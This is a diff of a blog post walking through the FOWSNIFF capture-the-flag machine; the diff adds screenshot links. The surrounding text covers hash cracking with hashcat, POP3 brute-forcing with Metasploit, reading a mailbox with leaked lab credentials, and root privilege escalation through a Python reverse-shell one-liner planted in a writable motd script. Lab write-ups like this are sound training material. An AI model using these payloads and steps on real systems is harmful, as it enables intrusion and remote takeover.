@@ -11,6 +11,8 @@ image:
 ---
 
 ## 🎯 FOWSNIFF CTF Walkthrough
+![](/assets/fow1.png)
+
 
 This guide details the steps to exploit the FOWSNIFF boot2root machine, targeting IP **10.10.25.67**.
 
@@ -19,6 +21,8 @@ This guide details the steps to exploit the FOWSNIFF boot2root machine, targetin
 The first step is to scan the target to identify open ports and services.
 
 **Query:** Using nmap, scan this machine. What ports are open?
+
+![](/assets/fow2.png)
 
 **Answer:**
 
@@ -42,6 +46,8 @@ We explore the open services, starting with the web server on Port 80, and use p
 
 The compromised data provides a list of usernames and their MD5 password hashes. These need to be cracked.
 
+![](/assets/fow3.png)
+
 **Query:** Can you decode these md5 hashes?
 
 **Process (using hashcat):**
@@ -53,6 +59,7 @@ Bash
 
 hashcat -m 0 md5.txt /usr/share/wordlists/rockyou.txt.gz --potfile-path cracked_passwords.txt
 
+![](/assets/fow4.png)
 **Result:** A list of clear-text usernames and passwords is recovered.
 
 ### 4\. Brute-Forcing POP3 Login (Metasploit)
@@ -64,10 +71,16 @@ With the recovered credentials, we attempt to brute-force the POP3 service on Po
 **Process:**
 
 - Create a file for known **usernames** (e.g., user.txt).
+  ![](/assets/fow5.png)
 - Create a file for known **passwords** (e.g., passwd.txt).
+  ![](/assets/fow6.png)
 - Launch **Metasploit** and use the auxiliary/scanner/pop3/pop3_login module.
-
+  ![](/assets/fow7.png)
+  
+  ![](/assets/fow8.png)
 **Query:** What was **seina's** password to the email service?
+
+  ![](/assets/fow9.png)
 
 **Answer (from successful brute-force):**
 
@@ -84,8 +97,12 @@ We use the successful login credentials for the user seina to access her mailbox
 - Connect to the POP3 service: nc 10.10.25.67 110
 - Authenticate with USER seina and PASS scoobydoo2.
 - List messages: LIST
+  
+  ![](/assets/fow10.png)
+  
 - Retrieve Message 1: RETR 1
-
+  
+![](/assets/fow11.png)
 **Query:** Looking through her emails, what was a temporary password set for her?
 
 **Answer (from Message 1):**
@@ -93,6 +110,8 @@ We use the successful login credentials for the user seina to access her mailbox
 **SSH Temporary Password:** S1ck3nBluff+secureshell
 
 - Retrieve Message 2: RETR 2
+
+  ![](/assets/fow12.png)
 
 **Query:** In the email, who send it?
 
@@ -110,7 +129,11 @@ Bash
 
 ssh baksteen@10.10.25.67
 
+ ![](/assets/fow13.png)
+
 **Query:** Once connected, what groups does this user belong to? Are there any interesting files that can be run by that group?
+
+![](/assets/fow14.png)
 
 **Investigation:**
 
@@ -118,9 +141,13 @@ ssh baksteen@10.10.25.67
 - Check for files writable by these groups or with unusual permissions.
 - We discover the executable script: **cube.sh**
 
+  ![](/assets/fow15.png)
+
 ### 7\. Privilege Escalation via Writable Script
 
 The cube.sh script is writable and executes upon SSH login via the update-motd.d mechanism. This is the key to gaining a root shell.
+
+![](/assets/fow16.png)
 
 **Query:** Now you have found a file that can be edited by the group, can you edit it to include a reverse shell?
 
@@ -128,6 +155,7 @@ The cube.sh script is writable and executes upon SSH login via the update-motd.d
 
 - **Modify cube.sh:** Edit the script to include a reverse shell payload.
   - **Note:** The script is triggered by /etc/update-motd.d/00-header when logging in via SSH.
+  
 
 **Python Reverse Shell Payload:**
 
@@ -137,6 +165,10 @@ Python
 
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("&lt;YOUR_IP&gt;",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(\["/bin/sh","-i"\]);'
 
+![](/assets/fow16.png)
+
+![](/assets/fow17.png)
+
 - **Set up Listener:** On your attack machine, start a netcat listener.
 
 Bash
@@ -145,17 +177,25 @@ nc -lvnp 1234
 
 - **Trigger the Shell:** Exit the current SSH session and log back in. The modified cube.sh will execute, sending a reverse shell to your listener.
 
+  ![](/assets/fow18.png)
+
+  
+
 Bash
 
 exit
 
 ssh baksteen@10.10.25.67
 
+![](/assets/fow19.png)
+ 
 - **Root Shell:** Upon successful login, you will receive a reverse shell as the **root** user on your netcat listener.
 
 ### 8\. Final Flag
 
 With root access, the final step is to locate and read the flag file.
+
+![](/assets/fow20.png)
 
 **Action:**
 
